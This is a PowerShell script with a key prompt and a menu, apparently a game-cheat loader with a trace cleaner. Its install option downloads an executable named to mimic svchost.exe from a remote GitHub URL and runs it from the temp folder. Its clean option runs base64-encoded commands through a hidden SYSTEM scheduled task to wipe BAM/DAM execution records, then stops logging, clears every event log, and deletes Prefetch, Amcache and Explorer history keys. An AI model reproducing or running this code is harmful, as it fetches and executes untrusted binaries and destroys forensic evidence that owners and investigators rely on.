$ErrorActionPreference = "SilentlyContinue"

[Console]::Title = "JETT.EXE ON TOP"

# =========================
# HEADER
# =========================

function Show-Header {

    Clear-Host


    Write-Host ""
    Write-Host "              SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS " -ForegroundColor White
    Write-Host "                 TEST POWERSHELL " -ForegroundColor DarkGray

    Write-Host ""
    Write-Host " ─────────────────────────────────────────────" -ForegroundColor DarkGray
    Write-Host ""

}



function Write-Console {

    param (
        [string]$Message,
        [string]$Type = "INFO"
    )

    switch ($Type) {

        "SUCCESS" {
            Write-Host "  [+] " -NoNewline -ForegroundColor Magenta
            Write-Host $Message -ForegroundColor White
        }

        "NO KEY" {
            Write-Host "  [-] " -NoNewline -ForegroundColor Red
            Write-Host $Message -ForegroundColor White
        }

        "INFO" {
            Write-Host "  [*] " -NoNewline -ForegroundColor DarkGray
            Write-Host $Message -ForegroundColor White
        }

        "INPUT" {
            Write-Host "  [>] " -NoNewline -ForegroundColor Magenta
            Write-Host $Message -NoNewline -ForegroundColor White
        }
    }
}



Show-Header

Write-Host ""
Write-Host "              E N T E R  K E Y" -ForegroundColor White
Write-Host ""

Write-Host "  [>] " -NoNewline -ForegroundColor Magenta

$key = $Host.UI.ReadLine()



if ([string]::IsNullOrWhiteSpace($key))
{
    Write-Host ""

    Write-Console "NO KEY" "NO KEY"

    Start-Sleep 2
    exit
}

Write-Host ""

Write-Console "SUCCESS" "SUCCESS"

Start-Sleep 1



while ($true)
{
    Show-Header

    Write-Console "1. INSTALL" "INFO"
    Write-Console "2. CLEAN" "INFO"
    Write-Console "0. EXIT" "INFO"

    Write-Host ""

    Write-Console "SELECT : " "INPUT"

    $choice = $Host.UI.ReadLine()



    if ($choice -eq "1")
    {
        Clear-Host
        Show-Header

        Write-Console "DOWNLOADING..." "INFO"

        $url  = "https://raw.githubusercontent.com/18321-creator/GGOSOS/refs/heads/main/svchost.exe"
        $path = "$env:TEMP\syshost.exe"

        try {

            Invoke-WebRequest `
            -Uri $url `
            -OutFile $path `
            -UseBasicParsing `
            -UserAgent "Mozilla/5.0"

            if (Test-Path $path)
            {
                Write-Host ""

                Write-Console "INSTALL SUCCESS" "SUCCESS"

                Start-Sleep 1

                Start-Process $path
            }
            else
            {
                Write-Host ""

                Write-Console "INSTALL FAILED" "NO KEY"
            }
        }
        catch {

            Write-Host ""

            Write-Console "INSTALL FAILED" "NO KEY"
        }

        Write-Host ""
        Pause
    }



elseif ($choice -eq "2")
{
    Clear-Host
    Show-Header

    # ตรวจสอบสิทธิ์ Administrator ทั่วไปก่อนรันสคริปต์หลัก
    $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) {
        Write-Console "Please run this script as Administrator!" "ERROR"
        Pause
        return
    }

    Write-Console "STARTING DEEP CLEANING PROCESS..." "INFO"

    # ==========================================
    # 1. จัดการประวัติ PowerShell History ใน Notepad
    # ==========================================
    $HistoryPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $HistoryPath) {
        Write-Console "Opening PowerShell History in Notepad..." "INFO"
        Start-Process "notepad.exe" -ArgumentList $HistoryPath -Wait
    }

    # ==========================================
    # 2. [เทคนิคพิเศษ SYSTEM Privileges] สแกนลบ BAM / DAM
    # ==========================================
    Write-Console "Injecting SYSTEM Task to force clear BAM/DAM entries..." "INFO"

    # สร้างโค้ดชิ้นย่อยเพื่อไปรันในสิทธิ์ SYSTEM
    $SystemScriptBlock = {
        $BamPaths = @(
            "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\bam\UserSettings",
            "Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\dam\UserSettings"
        )
        foreach ($RootPath in $BamPaths) {
            if (Test-Path $RootPath) {
                Get-ChildItem -Path $RootPath -ErrorAction SilentlyContinue | ForEach-Object {
                    $UserKeyPath = $_.PsPath
                    Get-ItemProperty -Path $UserKeyPath -ErrorAction SilentlyContinue | Get-Member -MemberType NoteProperty | ForEach-Object {
                        $ValueName = $_.Name
                        if ($ValueName -like "*\*" -and $ValueName -notlike "*System32*") {
                            $CleanPath = $ValueName
                            if ($ValueName -match "\\Device\\HarddiskVolume\d+(.*)") {
                                $CleanPath = $env:SystemDrive + $Matches[1]
                            }
                            # ถ้าตรวจพบว่าไม่มีโปรแกรมอยู่ในเครื่องแล้ว สั่งลบคาดโทษทันที
                            if (-not (Test-Path $CleanPath) -and $CleanPath -ne "") {
                                Remove-ItemProperty -Path $UserKeyPath -Name $ValueName -Force -ErrorAction SilentlyContinue
                            }
                        }
                    }
                }
            }
        }
    }

    # แปลงโค้ดชิ้นย่อยเป็น Base64 เพื่อให้ง่ายต่อการรันข้ามสิทธิ์ผ่าน Task
    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($SystemScriptBlock.ToString())
    $EncodedCommand = [Convert]::ToBase64String($Bytes)

    # ลงทะเบียนและสั่งรัน Task ทันทีในฐานะ SYSTEM เพื่อปลดล็อก Registry ที่โดนแบน
    $TaskName = "BAM_DAM_DeepClean"
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -EncodedCommand $EncodedCommand"
    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    
    $Task = Register-ScheduledTask -TaskName $TaskName -Action $Action -Principal $Principal -ErrorAction SilentlyContinue
    if ($Task) {
        Start-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 3 # รอให้ระบบประมวลผลลบไฟล์ Registry สักครู่
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
        Write-Console "Orphaned BAM/DAM entries cleaned successfully via SYSTEM mode." "SUCCES"
    } else {
        Write-Console "Failed to elevate to SYSTEM for BAM/DAM cleaning." "ERROR"
    }

    # ==========================================
    # 3. ลบไฟล์ระบบ / Logs / Cache ต่างๆ
    # ==========================================
    Write-Console "Cleaning System Files & Caches..." "INFO"

    Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue 
    Stop-Service -Name "EventLog" -Force -ErrorAction SilentlyContinue

    $TargetPaths = @(
        "$env:TEMP\*",
        "$env:SystemRoot\Temp\*",
        "$env:SystemRoot\Prefetch\*",
        "$env:SystemRoot\AppCompat\Programs\Amcache.hve*",
        "$env:SystemRoot\Minidump\*",
        "$env:SystemRoot\CrashDumps\*",
        "$env:LocalAppData\IconCache.db",
        "$env:LocalAppData\Microsoft\Windows\Explorer\thumbcache_*.db",
        "$env:ProgramData\Microsoft\Search\Data\Applications\Windows\Windows.edb", 
        "$env:SystemRoot\inf\setupapi.dev.log",
        "$env:SystemRoot\inf\setupapi.app.log",
        "$env:ProgramData\Microsoft\Windows\WER\*",
        "$env:SystemRoot\Logs\CBS\*",
        "$env:SystemRoot\Logs\DISM\*",
        "$env:SystemRoot\DeliveryOptimization\Cache\*",
        "$env:SystemRoot\WLANReport\*"
    )

    foreach ($Path in $TargetPaths) {
        Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue
    }

    # ==========================================
    # 4. ลบ Event Logs และประวัติใน Registry ทั่วไป
    # ==========================================
    Write-Console "Clearing All Event Logs & Registry Traces..." "INFO"
    
    Get-WinEvent -ListLog * -ErrorAction SilentlyContinue | ForEach-Object {
        wevtutil cl $_.LogName 2>$null
    }
    Remove-Item -Path "$env:SystemRoot\System32\Winevt\Logs\*" -Force -ErrorAction SilentlyContinue

    $RegistryKeys = @(
        "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU",
        "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Map Network Drive MRU"
    )

    foreach ($Key in $RegistryKeys) {
        if (Test-Path $Key) { Remove-Item -Path $Key -Recurse -Force -ErrorAction SilentlyContinue }
    }

    # คืนค่าระบบกลับสู่สภาวะปกติ
    Start-Service -Name "WSearch" -ErrorAction SilentlyContinue
    Start-Service -Name "EventLog" -ErrorAction SilentlyContinue

    Write-Host ""
    Write-Console "CLEAN ALL TRACES SUCCESS" "SUCCES"
    Write-Host ""
    Pause
}

    elseif ($choice -eq "0")
    {
        exit
    }
}
